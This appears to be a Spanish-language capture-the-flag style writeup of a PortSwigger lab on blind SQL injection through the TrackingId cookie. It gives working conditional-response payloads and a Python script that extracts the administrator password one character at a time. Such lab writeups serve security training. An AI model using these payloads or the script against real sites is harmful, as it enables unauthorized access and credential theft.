@@ -1,0 +1,132 @@
+---
+title: "#11 - Blind SQL injection with conditional response"
+description: "Extracción ciega de la contraseña del usuario administrator mediante inyección SQL basada en respuestas condicionales, automatizada con un script en Python."
+date: "2026-07-13"
+tags: ["portswigger", "sql-injection", "blind-sql-injection", "practitioner"]
+category: "sql-injection"
+difficulty: "PRACTITIONER"
+---
+
+Status: Completed
+Difficulty: PRACTITIONER
+Main Vulnerability: SQL Injection
+Platform: Portswigger
+
+**Laboratorio**: [Lab: Blind SQL injection with conditional responses | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+- **Objetivo**: Extraer la contraseña del usuario `administrator` mediante inyección SQL ciega basada en respuestas condicionales.
+
+## **Análisis inicial**
+
+Este laboratorio permite inyectar código SQL en la cookie `TrackingId`. No se muestra información directamente en la respuesta, pero la presencia o ausencia de cierto contenido (como un mensaje de bienvenida) permite inferir si una condición SQL se evaluó como verdadera.
+
+## **Consulta original:**
+
+```sql
+SELECT trackingId FROM tracking-table where trackingId = ""
+```
+
+El valor de la cookie `TrackingId` es vulnerable a inyección SQL. Aprovecharemos esto para ejecutar subconsultas condicionales y filtrar datos de la base de datos sin ver directamente los resultados.
+
+## **Solución**
+
+1. Verificar existencia de la tabla `users`:
+    
+    ```sql
+    TrackingId=' AND (SELECT 'a' FROM users LIMIT 1) = 'a' --
+    ```
+    
+    **Objetivo:** Confirmar que la tabla `users` existe. Si la condición es verdadera, se muestra un mensaje en la página.
+    
+2. Verificar existencia del usuario `administrator`:
+    
+    ```sql
+    TrackingId=' AND (SELECT username FROM users WHERE username = 'administrator') = 'administrator' --
+    ```
+    
+    **Objetivo:** Confirmar que el usuario `administrator` está presente en la base de datos.
+    
+3. Obtener la longitud de la contraseña:
+    
+    ```sql
+    TrackingId=' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20 --
+    ```
+    
+    **Resultado esperado:** Se valida si la contraseña tiene 20 caracteres (u otra longitud, ajustando el número). El cambio en la respuesta del servidor confirmará si la condición es verdadera.
+    
+4. Extraer la contraseña carácter por carácter:
+    
+    ```sql
+    TrackingId=' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a' --
+    ```
+    
+    **Explicación:**
+    
+    - `SUBSTRING(..., 1, 1)` extrae el primer carácter.
+    - Se cambia el valor `'a'` iterativamente por cada carácter del alfabeto hasta encontrar coincidencias.
+
+## **Automatización con Python**
+
+Para automatizar la extracción de la contraseña, se utilizó el siguiente script en Python:
+
+```python
+import requests              # Librería para realizar peticiones HTTP
+import string                # Proporciona cadenas de caracteres imprimibles
+import urllib.parse          # Útil para codificación de URLs (no usado directamente aquí)
+import urllib3               # Para gestionar advertencias SSL
+
+# Desactiva las advertencias por certificados SSL auto-firmados (común en labs)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# URL base del laboratorio (modifica según tu instancia)
+url = 'https://0a550059036c31ca80ab17d2001600e5.web-security-academy.net/'
+
+# Payload con formato: se inyecta en el valor de la cookie TrackingId
+# {} serán reemplazados por el índice del carácter y el carácter a probar
+payload = "'+and+(select+substring(password,{},1)+from+users+where+username='administrator')='{}'--"
+
+# Conjunto de caracteres posibles que podrían componer la contraseña
+characters = string.printable
+
+# Variable donde se almacenará la contraseña descubierta
+password = ''
+
+# Se asume una longitud de 20 caracteres en la contraseña
+for i in range(1, 21):  # Desde la posición 1 hasta 20
+    for char in characters:
+        # Se construye la cookie con la inyección SQL para cada carácter
+        cookie = {
+            'TrackingId': 'LWeCp2OLn9FMlPlC' + payload.format(i, char)
+        }
+
+        # Se envía la petición con la cookie manipulada
+        r = requests.get(url, cookies=cookie, verify=False)
+
+        # Verificamos si la respuesta contiene la palabra clave ("Welcome"),
+        # lo que indica que la condición inyectada fue verdadera
+        if "Welcome" in r.text:
+            # Si acertamos con el carácter, lo agregamos a la contraseña
+            password += char
+            break  # Pasamos al siguiente carácter
+    # Se imprime el progreso parcial de la contraseña
+    print("[*] La contraseña es: {}".format(password))
+```
+
+**Descripción del script:**
+
+- Recorre la contraseña carácter por carácter.
+- Inyecta el payload dentro de la cookie `TrackingId`.
+- Evalúa si la respuesta contiene el texto `"Welcome"`, lo cual indica una condición verdadera.
+- Construye la contraseña concatenando cada carácter detectado.
+
+**Resultado en consola:**
+
+**Contraseña**: 152yzlatubkrfeh5uk1m (La contraseña puede variar)
+
+![Resultado en consola mostrando el progreso de la contraseña extraída carácter por carácter](/writeups/portswigger/11_blind_sql_injection_conditional_responses/image.png)
+
+## ✅ **Conclusión**
+
+La contraseña del usuario `administrator` fue extraída exitosamente utilizando una inyección SQL ciega basada en respuestas condicionales. El proceso se realizó de forma automatizada con un script en Python.
+
+![Confirmación final de la contraseña extraída y del laboratorio resuelto](/writeups/portswigger/11_blind_sql_injection_conditional_responses/image%201.png)
